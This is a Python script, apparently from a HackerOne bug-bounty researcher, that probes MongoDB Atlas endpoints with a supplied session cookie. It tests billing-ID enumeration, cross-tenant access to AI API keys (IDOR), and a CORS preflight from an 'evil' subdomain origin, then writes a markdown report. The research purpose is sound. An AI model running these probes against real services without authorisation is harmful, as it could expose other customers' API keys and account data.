#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
auditar_vectores.py — Utility to test and audit MongoDB Atlas API endpoints
for Vector 4 (Billing Enumeration), Vector 5 (AI API Keys IDOR), and Vector 6 (Auth Preflight).
Includes required research headers. No external dependencies.
"""

import sys
import os
import urllib.request
import urllib.error
import json
import re

# Mandatory HackerOne research header
H1_HEADER_NAME = "X-HackerOne-Research"
H1_HEADER_VAL = "tomas244"

# Default testing IDs (Account A - Tester, Account B - Victim)
DEFAULT_ORG_A = "6a4c0a54b388b65b11799a24"
DEFAULT_PROJ_A = "6a4c0a54b388b65b11799a58"

DEFAULT_ORG_B = "6a4d7d849d5dcab6abad6820"
DEFAULT_PROJ_B = "6a4d7d849d5dcab6abad6845"

FAKE_ORG = "6a4d7d849d5dcab6abad0000"
FAKE_PROJ = "6a4d7d849d5dcab6abad0000"

def parse_cookies(cookie_str):
    """Clean and return cookies dictionary/string format."""
    return cookie_str.strip()

def send_request(url, method="GET", headers=None, body=None):
    """Helper to send HTTP request using urllib.request and return status, headers, and body."""
    if headers is None:
        headers = {}
    
    # Always include the HackerOne Research Header
    headers[H1_HEADER_NAME] = H1_HEADER_VAL
    
    req = urllib.request.Request(url, method=method)
    for k, v in headers.items():
        req.add_header(k, v)
        
    data = None
    if body:
        if isinstance(body, dict) or isinstance(body, list):
            data = json.dumps(body).encode('utf-8')
            req.add_header("Content-Type", "application/json")
        else:
            data = body.encode('utf-8')
            
    try:
        with urllib.request.urlopen(req, data=data, timeout=10) as response:
            resp_body = response.read().decode('utf-8', errors='ignore')
            resp_headers = dict(response.info())
            return response.status, resp_headers, resp_body
    except urllib.error.HTTPError as e:
        resp_body = e.read().decode('utf-8', errors='ignore')
        resp_headers = dict(e.info())
        return e.code, resp_headers, resp_body
    except Exception as e:
        return 0, {}, f"Connection Error: {e}"

def run_audit(cookies_raw, org_a, proj_a, org_b, proj_b):
    print("=" * 65)
    print("  🚀 INICIANDO AUDITORÍA AUTOMATIZADA DE VECTORES RESTANTES")
    print(f"  Target: cloud.mongodb.com | Header: {H1_HEADER_NAME}: {H1_HEADER_VAL}")
    print("=" * 65)
    
    headers = {
        "Cookie": parse_cookies(cookies_raw),
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*"
    }
    
    results = []
    
    # -------------------------------------------------------------
    # VECTOR 4: Oracle de Enumeración en /billing/
    # -------------------------------------------------------------
    print("\n[+] Auditando Vector 4: Billing Enumeration...")
    v4_targets = [
        # payingOrg
        ("GET", f"https://cloud.mongodb.com/billing/payingOrg/{org_a}", "Billing: payingOrg (Cuenta A - Propio)"),
        ("GET", f"https://cloud.mongodb.com/billing/payingOrg/{org_b}", "Billing: payingOrg (Cuenta B - Víctima)"),
        ("GET", f"https://cloud.mongodb.com/billing/payingOrg/{FAKE_ORG}", "Billing: payingOrg (Org Falsa)"),
        # projectLevelSupportActiveDate
        ("GET", f"https://cloud.mongodb.com/billing/orgs/{org_a}/projectLevelSupportActiveDate", "Billing: SupportActiveDate (Cuenta A - Propio)"),
        ("GET", f"https://cloud.mongodb.com/billing/orgs/{org_b}/projectLevelSupportActiveDate", "Billing: SupportActiveDate (Cuenta B - Víctima)"),
        ("GET", f"https://cloud.mongodb.com/billing/orgs/{FAKE_ORG}/projectLevelSupportActiveDate", "Billing: SupportActiveDate (Org Falsa)"),
    ]
    
    for method, url, name in v4_targets:
        status, resp_headers, body = send_request(url, method, headers)
        preview = body[:120].replace('\n', ' ').strip()
        results.append({
            "vector": "Vector 4 (Billing)",
            "name": name,
            "url": url,
            "status": status,
            "error_code": resp_headers.get("X-Error-Code", "N/A"),
            "body": preview
        })
        print(f"    - {name}: HTTP {status} | Code: {resp_headers.get('X-Error-Code', 'N/A')}")
        
    # -------------------------------------------------------------
    # VECTOR 5: AI API Keys de Otros Proyectos
    # -------------------------------------------------------------
    print("\n[+] Auditando Vector 5: AI API Keys IDOR...")
    v5_targets = [
        ("GET", f"https://cloud.mongodb.com/aiModelApi/{org_a}/apiKeys/project/{proj_a}/paginated?pageNum=1&itemsPerPage=100", "AI Keys: Paginated (Cuenta A -> Proy A)"),
        ("GET", f"https://cloud.mongodb.com/aiModelApi/{org_b}/apiKeys/project/{proj_b}/paginated?pageNum=1&itemsPerPage=100", "AI Keys: Paginated (Cuenta A -> Proy B)"),
        ("GET", f"https://cloud.mongodb.com/aiModelApi/{org_a}/apiKeys/project/{proj_b}/paginated?pageNum=1&itemsPerPage=100", "AI Keys: Paginated (Cruzado Org A -> Proy B)"),
        ("GET", f"https://cloud.mongodb.com/aiModelApi/{org_b}/apiKeys/project/{proj_a}/paginated?pageNum=1&itemsPerPage=100", "AI Keys: Paginated (Cruzado Org B -> Proy A)"),
    ]
    
    for method, url, name in v5_targets:
        status, resp_headers, body = send_request(url, method, headers)
        preview = body[:120].replace('\n', ' ').strip()
        results.append({
            "vector": "Vector 5 (AI Keys)",
            "name": name,
            "url": url,
            "status": status,
            "error_code": resp_headers.get("X-Error-Code", "N/A"),
            "body": preview
        })
        print(f"    - {name}: HTTP {status} | Code: {resp_headers.get('X-Error-Code', 'N/A')}")

    # -------------------------------------------------------------
    # VECTOR 6: CORS / User Auth Code creation timestamp
    # -------------------------------------------------------------
    print("\n[+] Auditando Vector 6: /user/authCodeCreationTimestamp CORS & Active Session...")
    
    # Test GET with session
    url_v6 = "https://cloud.mongodb.com/user/authCodeCreationTimestamp"
    status, resp_headers, body = send_request(url_v6, "GET", headers)
    preview = body[:120].replace('\n', ' ').strip()
    results.append({
        "vector": "Vector 6 (AuthCode GET)",
        "name": "AuthCode GET (Con Sesión)",
        "url": url_v6,
        "status": status,
        "error_code": resp_headers.get("X-Error-Code", "N/A"),
        "body": preview
    })
    print(f"    - AuthCode GET (Con Sesión): HTTP {status} | Code: {resp_headers.get('X-Error-Code', 'N/A')}")
    
    # Test OPTIONS preflight CORS
    cors_headers = {
        "Origin": "https://evil.mongodb.com",
        "Access-Control-Request-Method": "GET",
        "Access-Control-Request-Headers": "x-requested-with",
        "User-Agent": headers["User-Agent"]
    }
    status_options, resp_headers_options, body_options = send_request(url_v6, "OPTIONS", cors_headers)
    results.append({
        "vector": "Vector 6 (CORS Preflight)",
        "name": "AuthCode OPTIONS (Preflight Origin: evil.mongodb.com)",
        "url": url_v6,
        "status": status_options,
        "error_code": "N/A",
        "body": f"ACAO: {resp_headers_options.get('access-control-allow-origin', 'None')} | ACAC: {resp_headers_options.get('access-control-allow-credentials', 'None')}"
    })
    print(f"    - AuthCode OPTIONS Preflight: HTTP {status_options} | ACAO: {resp_headers_options.get('access-control-allow-origin', 'None')}")

    # -------------------------------------------------------------
    # GENERAR REPORTE
    # -------------------------------------------------------------
    report_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "../AUDITORIAS/RESULTADO_AUDITORIA_VECTORES.md")
    with open(report_path, "w", encoding="utf-8") as f:
        f.write("# 📊 REPORTE DE AUDITORÍA DE VECTORES DE MONGO\n\n")
        f.write(f"- **Ejecutado**: Automáticamente desde `auditar_vectores.py`\n")
        f.write(f"- **Cabecera obligatoria**: `{H1_HEADER_NAME}: {H1_HEADER_VAL}`\n")
        f.write(f"- **Cuenta A (Tester)**: Org ID `{org_a}` | Proj ID `{proj_a}`\n")
        f.write(f"- **Cuenta B (Víctima)**: Org ID `{org_b}` | Proj ID `{proj_b}`\n\n")
        
        f.write("## Resumen de Resultados\n\n")
        f.write("| Vector | Prueba | Endpoint | Status | Error Code | Response Preview / CORS Headers |\n")
        f.write("|---|---|---|---|---|---|\n")
        for r in results:
            f.write(f"| {r['vector']} | {r['name']} | `{r['url']}` | **{r['status']}** | `{r['error_code']}` | `{r['body']}` |\n")
            
        f.write("\n## Conclusiones Técnicas\n\n")
        f.write("### 1. Vector 4 — Enumeración de Billing\n")
        f.write("- Si los códigos de error difieren entre la Org B y la Org Falsa, se confirma un oráculo de divulgación de información.\n")
        f.write("- Si ambos retornan un HTML 404 genérico o el mismo código de error, el endpoint no es explotable para enumerar.\n\n")
        
        f.write("### 2. Vector 5 — AI API Keys IDOR\n")
        f.write("- Si el cruce (Org A consultando Proy B o viceversa) devuelve un status **200 OK** con resultados (o incluso vacío `[]` sin 403), representa una vulnerabilidad de control de acceso.\n")
        f.write("- Si devuelve **403 Forbidden** o **401 Unauthorized**, la protección de acceso está implementada de manera correcta.\n\n")
        
        f.write("### 3. Vector 6 — CORS / AuthCode\n")
        f.write("- Si el preflight de OPTIONS con Origin `https://evil.mongodb.com` refleja ese origin en la cabecera `Access-Control-Allow-Origin`, indica un bypass CORS explotable mediante XSS en cualquier subdominio.\n")
        
    print(f"\n[+] Auditoría terminada. Reporte markdown generado en: {os.path.normpath(report_path)}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 auditar_vectores.py \"[SESSION_COOKIE_VALUE]\" [ORG_A] [PROJ_A] [ORG_B] [PROJ_B]")
        print("Ejemplo:")
        print("  python3 auditar_vectores.py \"ajs_user_id=...; cloud-user=...\"")
        sys.exit(1)
        
    cookies = sys.argv[1]
    org_a = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_ORG_A
    proj_a = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_PROJ_A
    org_b = sys.argv[4] if len(sys.argv) > 4 else DEFAULT_ORG_B
    proj_b = sys.argv[5] if len(sys.argv) > 5 else DEFAULT_PROJ_B
    
    run_audit(cookies, org_a, proj_a, org_b, proj_b)
